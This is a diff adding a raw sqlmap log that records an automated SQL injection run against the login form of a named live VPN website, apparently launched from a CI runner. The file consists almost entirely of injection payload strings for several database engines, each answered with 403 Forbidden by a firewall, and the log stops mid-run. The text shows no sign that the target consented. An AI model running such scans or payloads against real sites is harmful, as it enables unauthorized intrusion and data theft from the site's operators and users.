@@ -1,0 +1,1292 @@
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.10.10#pip}
+|_ -| . [(]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:18:47 /2026-10-24/
+
+[08:18:47] [INFO] parsing HTTP request from '/tmp/sqlmap_req.txt'
+[08:18:47] [DEBUG] cleaning up configuration parameters
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[08:18:47] [DEBUG] setting the HTTP timeout
+[08:18:47] [DEBUG] setting the HTTP User-Agent header
+[08:18:47] [DEBUG] loading random HTTP User-Agent header(s) from file '/home/runner/.local/lib/python3.12/site-packages/sqlmap/data/txt/user-agents.txt'
+[08:18:47] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36' from file '/home/runner/.local/lib/python3.12/site-packages/sqlmap/data/txt/user-agents.txt'
+[08:18:47] [DEBUG] creating HTTP requests opener object
+it appears that provided value for POST parameter 'email' has boundaries. Do you want to inject inside? ('@EMAIL*@') [y/N] N
+[08:18:47] [DEBUG] used the default behavior, running in batch mode
+POST parameter '_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
+[08:18:47] [DEBUG] used the default behavior, running in batch mode
+[08:18:47] [DEBUG] resolving hostname 'www.nadiavpn.web.id'
+[08:18:47] [INFO] testing connection to the target URL
+[08:18:48] [DEBUG] declared web page charset 'utf-8'
+got a 301 redirect to 'https://www.nadiavpn.web.id/login'. Do you want to follow? [Y/n] Y
+[08:18:48] [DEBUG] used the default behavior, running in batch mode
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+[08:18:48] [DEBUG] used the default behavior, running in batch mode
+[08:18:48] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+[08:18:48] [INFO] testing if the target URL content is stable
+[08:18:49] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:18:49] [WARNING] POST parameter '_token' does not appear to be dynamic
+[08:18:49] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ))",..',.,-- -
+[08:18:50] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:18:50] [WARNING] heuristic (basic) test shows that POST parameter '_token' might not be SQL injectable
+[08:18:50] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' 'egujPC<'">)lkbtIn-- -
+[08:18:51] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:18:52] [INFO] testing for SQL injection on POST parameter '_token'
+[08:18:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[08:18:52] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga'  AND 3820=6624-- -
+[08:18:53] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:18:53] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga'  AND 6841=6841-- -
+[08:18:54] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:18:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[08:18:54] [PAYLOAD] -9112'  OR 6755=2004-- -
+[08:18:55] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:18:55] [PAYLOAD] -5915'  OR 8027=8027-- -
+[08:18:56] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:18:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[08:18:56] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga'  OR NOT 2745=5651-- -
+[08:18:57] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:18:57] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga'  OR NOT 3580=3580-- -
+[08:18:58] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:18:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[08:18:58] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga'  AND 4111=(SELECT (CASE WHEN (4111=3036) THEN 4111 ELSE (SELECT 3036 UNION SELECT 7146) END))-- -
+[08:18:59] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:18:59] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga'  AND 1980=(SELECT (CASE WHEN (1980=1980) THEN 1980 ELSE (SELECT 7907 UNION SELECT 9503) END))-- -
+[08:19:00] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[08:19:00] [PAYLOAD] -5991'  OR 2401=(SELECT (CASE WHEN (2401=7806) THEN 2401 ELSE (SELECT 7806 UNION SELECT 9396) END))-- -
+[08:19:01] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:01] [PAYLOAD] -3520'  OR 3852=(SELECT (CASE WHEN (3852=3852) THEN 3852 ELSE (SELECT 5965 UNION SELECT 4432) END))-- -
+[08:19:03] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[08:19:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
+[08:19:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
+[08:19:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[08:19:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[08:19:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[08:19:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[08:19:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[08:19:03] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[08:19:03] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga'  RLIKE (SELECT (CASE WHEN (8537=2764) THEN 0x4875305245644834563630517a6c6868536258536e72685732746a70643861333532597a73316761 ELSE 0x28 END))-- -
+[08:19:04] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:04] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga'  RLIKE (SELECT (CASE WHEN (7485=7485) THEN 0x4875305245644834563630517a6c6868536258536e72685732746a70643861333532597a73316761 ELSE 0x28 END))-- -
+[08:19:05] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:05] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[08:19:05] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga'  AND MAKE_SET(9348=5084,5084)-- -
+[08:19:06] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:06] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga'  AND MAKE_SET(5905=5905,6513)-- -
+[08:19:07] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:07] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[08:19:07] [PAYLOAD] -5814'  OR MAKE_SET(3761=5744,5744)-- -
+[08:19:08] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:08] [PAYLOAD] -5449'  OR MAKE_SET(5044=5044,6945)-- -
+[08:19:09] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:09] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[08:19:09] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga'  AND ELT(6886=4866,4866)-- -
+[08:19:10] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:10] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga'  AND ELT(8965=8965,2737)-- -
+[08:19:11] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:11] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[08:19:11] [PAYLOAD] -5261'  OR ELT(5920=1313,1313)-- -
+[08:19:12] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:12] [PAYLOAD] -6169'  OR ELT(8268=8268,4736)-- -
+[08:19:13] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:13] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[08:19:13] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga'  AND EXTRACTVALUE(3582,CASE WHEN (3582=3261) THEN 3582 ELSE 0x3A END)-- -
+[08:19:15] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:15] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga'  AND EXTRACTVALUE(5822,CASE WHEN (5822=5822) THEN 5822 ELSE 0x3A END)-- -
+[08:19:16] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:16] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[08:19:16] [PAYLOAD] -8618'  OR EXTRACTVALUE(6294,CASE WHEN (6294=6374) THEN 6294 ELSE 0x3A END)-- -
+[08:19:17] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:17] [PAYLOAD] -2937'  OR EXTRACTVALUE(2576,CASE WHEN (2576=2576) THEN 2576 ELSE 0x3A END)-- -
+[08:19:18] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:18] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[08:19:18] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga'  AND (SELECT (CASE WHEN (3542=7877) THEN NULL ELSE CAST((CHR(84)||CHR(108)||CHR(86)||CHR(85)) AS NUMERIC) END)) IS NULL-- -
+[08:19:19] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:19] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga'  AND (SELECT (CASE WHEN (3128=3128) THEN NULL ELSE CAST((CHR(117)||CHR(83)||CHR(119)||CHR(79)) AS NUMERIC) END)) IS NULL-- -
+[08:19:20] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:20] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
+[08:19:20] [PAYLOAD] -1056'  OR (SELECT (CASE WHEN (9832=3155) THEN NULL ELSE CAST((CHR(117)||CHR(65)||CHR(80)||CHR(120)) AS NUMERIC) END)) IS NULL-- -
+[08:19:21] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:21] [PAYLOAD] -1845'  OR (SELECT (CASE WHEN (1023=1023) THEN NULL ELSE CAST((CHR(76)||CHR(97)||CHR(87)||CHR(108)) AS NUMERIC) END)) IS NULL-- -
+[08:19:22] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:22] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[08:19:22] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga'  AND (SELECT (CASE WHEN (1832=9508) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,1832) END) FROM DUAL) IS NULL-- -
+[08:19:23] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:23] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga'  AND (SELECT (CASE WHEN (9208=9208) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,9208) END) FROM DUAL) IS NULL-- -
+[08:19:24] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:24] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[08:19:24] [PAYLOAD] -4133'  OR (SELECT (CASE WHEN (4969=1195) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4969) END) FROM DUAL) IS NULL-- -
+[08:19:25] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:25] [PAYLOAD] -5041'  OR (SELECT (CASE WHEN (4558=4558) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4558) END) FROM DUAL) IS NULL-- -
+[08:19:27] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:27] [INFO] testing 'SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)'
+[08:19:27] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga'  AND CASE WHEN 7863=6995 THEN 7863 ELSE JSON(CHAR(79,81,114,99)) END-- -
+[08:19:28] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:28] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga'  AND CASE WHEN 7232=7232 THEN 7232 ELSE JSON(CHAR(97,111,100,111)) END-- -
+[08:19:29] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:29] [INFO] testing 'SQLite OR boolean-based blind - WHERE or HAVING clause (JSON)'
+[08:19:29] [PAYLOAD] -4430'  OR CASE WHEN 9863=9655 THEN 9863 ELSE JSON(CHAR(120,79,115,82)) END-- -
+[08:19:30] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:30] [PAYLOAD] -4422'  OR CASE WHEN 2004=2004 THEN 2004 ELSE JSON(CHAR(69,75,65,88)) END-- -
+[08:19:31] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:31] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[08:19:31] [PAYLOAD] '  (SELECT (CASE WHEN (9583=7114) THEN 'Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ELSE (SELECT 7114 UNION SELECT 5001) END))-- -
+[08:19:32] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:32] [PAYLOAD] '  (SELECT (CASE WHEN (9307=9307) THEN 'Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ELSE (SELECT 3031 UNION SELECT 1697) END))-- -
+[08:19:33] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:33] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
+[08:19:33] [PAYLOAD] '  MAKE_SET(1507=8962,8962)-- -
+[08:19:34] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:34] [PAYLOAD] '  MAKE_SET(4965=4965,9006)-- -
+[08:19:35] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:35] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
+[08:19:35] [PAYLOAD] '  MAKE_SET(8884=4357,0x4875305245644834563630517a6c6868536258536e72685732746a70643861333532597a73316761)-- -
+[08:19:36] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:36] [PAYLOAD] '  MAKE_SET(7713=7713,0x4875305245644834563630517a6c6868536258536e72685732746a70643861333532597a73316761)-- -
+[08:19:37] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:37] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
+[08:19:37] [PAYLOAD] '  ELT(7332=5591,5591)-- -
+[08:19:39] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:39] [PAYLOAD] '  ELT(5277=5277,8264)-- -
+[08:19:40] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:40] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
+[08:19:40] [PAYLOAD] '  ELT(8086=3722,0x4875305245644834563630517a6c6868536258536e72685732746a70643861333532597a73316761)-- -
+[08:19:41] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:41] [PAYLOAD] '  ELT(8736=8736,0x4875305245644834563630517a6c6868536258536e72685732746a70643861333532597a73316761)-- -
+[08:19:42] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
+[08:19:42] [PAYLOAD] '  (4118=6856)*6856-- -
+[08:19:43] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:43] [PAYLOAD] '  (6932=6932)*2082-- -
+[08:19:44] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:44] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
+[08:19:44] [PAYLOAD] '  (1776=5791)*0x4875305245644834563630517a6c6868536258536e72685732746a70643861333532597a73316761-- -
+[08:19:45] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:45] [PAYLOAD] '  (4382=4382)*0x4875305245644834563630517a6c6868536258536e72685732746a70643861333532597a73316761-- -
+[08:19:46] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:46] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
+[08:19:46] [PAYLOAD] '  (SELECT (CASE WHEN (2134=9127) THEN 2134 ELSE 1/(SELECT 0) END))-- -
+[08:19:47] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:47] [PAYLOAD] '  (SELECT (CASE WHEN (5395=5395) THEN 5395 ELSE 1/(SELECT 0) END))-- -
+[08:19:48] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:48] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
+[08:19:48] [PAYLOAD] '  (SELECT (CASE WHEN (6475=9255) THEN (CHR(72)||CHR(117)||CHR(48)||CHR(82)||CHR(69)||CHR(100)||CHR(72)||CHR(52)||CHR(86)||CHR(54)||CHR(48)||CHR(81)||CHR(122)||CHR(108)||CHR(104)||CHR(104)||CHR(83)||CHR(98)||CHR(88)||CHR(83)||CHR(110)||CHR(114)||CHR(104)||CHR(87)||CHR(50)||CHR(116)||CHR(106)||CHR(112)||CHR(100)||CHR(56)||CHR(97)||CHR(51)||CHR(53)||CHR(50)||CHR(89)||CHR(122)||CHR(115)||CHR(49)||CHR(103)||CHR(97)) ELSE 1/(SELECT 0) END))-- -
+[08:19:49] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:49] [PAYLOAD] '  (SELECT (CASE WHEN (4983=4983) THEN (CHR(72)||CHR(117)||CHR(48)||CHR(82)||CHR(69)||CHR(100)||CHR(72)||CHR(52)||CHR(86)||CHR(54)||CHR(48)||CHR(81)||CHR(122)||CHR(108)||CHR(104)||CHR(104)||CHR(83)||CHR(98)||CHR(88)||CHR(83)||CHR(110)||CHR(114)||CHR(104)||CHR(87)||CHR(50)||CHR(116)||CHR(106)||CHR(112)||CHR(100)||CHR(56)||CHR(97)||CHR(51)||CHR(53)||CHR(50)||CHR(89)||CHR(122)||CHR(115)||CHR(49)||CHR(103)||CHR(97)) ELSE 1/(SELECT 0) END))-- -
+[08:19:50] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:51] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
+[08:19:51] [PAYLOAD] '  (SELECT * FROM GENERATE_SERIES(7857,7857,CASE WHEN (7857=1941) THEN 1 ELSE 0 END) LIMIT 1)-- -
+[08:19:52] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:52] [PAYLOAD] '  (SELECT * FROM GENERATE_SERIES(5753,5753,CASE WHEN (5753=5753) THEN 1 ELSE 0 END) LIMIT 1)-- -
+[08:19:53] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:53] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
+[08:19:53] [PAYLOAD] '  (SELECT (CHR(72)||CHR(117)||CHR(48)||CHR(82)||CHR(69)||CHR(100)||CHR(72)||CHR(52)||CHR(86)||CHR(54)||CHR(48)||CHR(81)||CHR(122)||CHR(108)||CHR(104)||CHR(104)||CHR(83)||CHR(98)||CHR(88)||CHR(83)||CHR(110)||CHR(114)||CHR(104)||CHR(87)||CHR(50)||CHR(116)||CHR(106)||CHR(112)||CHR(100)||CHR(56)||CHR(97)||CHR(51)||CHR(53)||CHR(50)||CHR(89)||CHR(122)||CHR(115)||CHR(49)||CHR(103)||CHR(97)) FROM GENERATE_SERIES(2686,2686,CASE WHEN (2686=9584) THEN 1 ELSE 0 END) LIMIT 1)-- -
+[08:19:54] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:54] [PAYLOAD] '  (SELECT (CHR(72)||CHR(117)||CHR(48)||CHR(82)||CHR(69)||CHR(100)||CHR(72)||CHR(52)||CHR(86)||CHR(54)||CHR(48)||CHR(81)||CHR(122)||CHR(108)||CHR(104)||CHR(104)||CHR(83)||CHR(98)||CHR(88)||CHR(83)||CHR(110)||CHR(114)||CHR(104)||CHR(87)||CHR(50)||CHR(116)||CHR(106)||CHR(112)||CHR(100)||CHR(56)||CHR(97)||CHR(51)||CHR(53)||CHR(50)||CHR(89)||CHR(122)||CHR(115)||CHR(49)||CHR(103)||CHR(97)) FROM GENERATE_SERIES(2646,2646,CASE WHEN (2646=2646) THEN 1 ELSE 0 END) LIMIT 1)-- -
+[08:19:55] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:55] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
+[08:19:55] [PAYLOAD] '  (SELECT (CASE WHEN (1191=4452) THEN 1191 ELSE 1191*(SELECT 1191 UNION ALL SELECT 4452) END))-- -
+[08:19:56] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:56] [PAYLOAD] '  (SELECT (CASE WHEN (8525=8525) THEN 8525 ELSE 8525*(SELECT 8525 UNION ALL SELECT 2592) END))-- -
+[08:19:57] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:57] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
+[08:19:57] [PAYLOAD] '  (SELECT (CASE WHEN (9943=5200) THEN CHAR(72)+CHAR(117)+CHAR(48)+CHAR(82)+CHAR(69)+CHAR(100)+CHAR(72)+CHAR(52)+CHAR(86)+CHAR(54)+CHAR(48)+CHAR(81)+CHAR(122)+CHAR(108)+CHAR(104)+CHAR(104)+CHAR(83)+CHAR(98)+CHAR(88)+CHAR(83)+CHAR(110)+CHAR(114)+CHAR(104)+CHAR(87)+CHAR(50)+CHAR(116)+CHAR(106)+CHAR(112)+CHAR(100)+CHAR(56)+CHAR(97)+CHAR(51)+CHAR(53)+CHAR(50)+CHAR(89)+CHAR(122)+CHAR(115)+CHAR(49)+CHAR(103)+CHAR(97) ELSE 9943*(SELECT 9943 UNION ALL SELECT 5200) END))-- -
+[08:19:58] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:58] [PAYLOAD] '  (SELECT (CASE WHEN (4388=4388) THEN CHAR(72)+CHAR(117)+CHAR(48)+CHAR(82)+CHAR(69)+CHAR(100)+CHAR(72)+CHAR(52)+CHAR(86)+CHAR(54)+CHAR(48)+CHAR(81)+CHAR(122)+CHAR(108)+CHAR(104)+CHAR(104)+CHAR(83)+CHAR(98)+CHAR(88)+CHAR(83)+CHAR(110)+CHAR(114)+CHAR(104)+CHAR(87)+CHAR(50)+CHAR(116)+CHAR(106)+CHAR(112)+CHAR(100)+CHAR(56)+CHAR(97)+CHAR(51)+CHAR(53)+CHAR(50)+CHAR(89)+CHAR(122)+CHAR(115)+CHAR(49)+CHAR(103)+CHAR(97) ELSE 4388*(SELECT 4388 UNION ALL SELECT 6504) END))-- -
+[08:19:59] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:19:59] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
+[08:19:59] [PAYLOAD] '  (SELECT (CASE WHEN (2238=1030) THEN 2238 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- -
+[08:20:00] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:00] [PAYLOAD] '  (SELECT (CASE WHEN (3243=3243) THEN 3243 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- -
+[08:20:01] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:01] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
+[08:20:01] [PAYLOAD] '  (SELECT (CASE WHEN (3065=1058) THEN CHR(72)||CHR(117)||CHR(48)||CHR(82)||CHR(69)||CHR(100)||CHR(72)||CHR(52)||CHR(86)||CHR(54)||CHR(48)||CHR(81)||CHR(122)||CHR(108)||CHR(104)||CHR(104)||CHR(83)||CHR(98)||CHR(88)||CHR(83)||CHR(110)||CHR(114)||CHR(104)||CHR(87)||CHR(50)||CHR(116)||CHR(106)||CHR(112)||CHR(100)||CHR(56)||CHR(97)||CHR(51)||CHR(53)||CHR(50)||CHR(89)||CHR(122)||CHR(115)||CHR(49)||CHR(103)||CHR(97) ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- -
+[08:20:02] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:02] [PAYLOAD] '  (SELECT (CASE WHEN (9131=9131) THEN CHR(72)||CHR(117)||CHR(48)||CHR(82)||CHR(69)||CHR(100)||CHR(72)||CHR(52)||CHR(86)||CHR(54)||CHR(48)||CHR(81)||CHR(122)||CHR(108)||CHR(104)||CHR(104)||CHR(83)||CHR(98)||CHR(88)||CHR(83)||CHR(110)||CHR(114)||CHR(104)||CHR(87)||CHR(50)||CHR(116)||CHR(106)||CHR(112)||CHR(100)||CHR(56)||CHR(97)||CHR(51)||CHR(53)||CHR(50)||CHR(89)||CHR(122)||CHR(115)||CHR(49)||CHR(103)||CHR(97) ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- -
+[08:20:04] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:04] [INFO] testing 'Informix boolean-based blind - Parameter replace'
+[08:20:04] [PAYLOAD] '  (SELECT (CASE WHEN (9456=8889) THEN 9456 ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)-- -
+[08:20:05] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:05] [PAYLOAD] '  (SELECT (CASE WHEN (5523=5523) THEN 5523 ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)-- -
+[08:20:06] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:06] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
+[08:20:06] [PAYLOAD] '  (SELECT (CASE WHEN (4974=1441) THEN 'Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ELSE 4974 END) FROM SYSMASTER:SYSDUAL)-- -
+[08:20:07] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:07] [PAYLOAD] '  (SELECT (CASE WHEN (6317=6317) THEN 'Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ELSE 6317 END) FROM SYSMASTER:SYSDUAL)-- -
+[08:20:08] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:08] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
+[08:20:08] [PAYLOAD] '  IIF(1466=1976,1466,1/0)-- -
+[08:20:09] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:09] [PAYLOAD] '  IIF(3031=3031,3031,1/0)-- -
+[08:20:10] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:10] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
+[08:20:10] [PAYLOAD] '  IIF(4660=1198,CHR(72)&CHR(117)&CHR(48)&CHR(82)&CHR(69)&CHR(100)&CHR(72)&CHR(52)&CHR(86)&CHR(54)&CHR(48)&CHR(81)&CHR(122)&CHR(108)&CHR(104)&CHR(104)&CHR(83)&CHR(98)&CHR(88)&CHR(83)&CHR(110)&CHR(114)&CHR(104)&CHR(87)&CHR(50)&CHR(116)&CHR(106)&CHR(112)&CHR(100)&CHR(56)&CHR(97)&CHR(51)&CHR(53)&CHR(50)&CHR(89)&CHR(122)&CHR(115)&CHR(49)&CHR(103)&CHR(97),1/0)-- -
+[08:20:11] [DEBUG] got HTTP error code: 403 ('Forbidden')
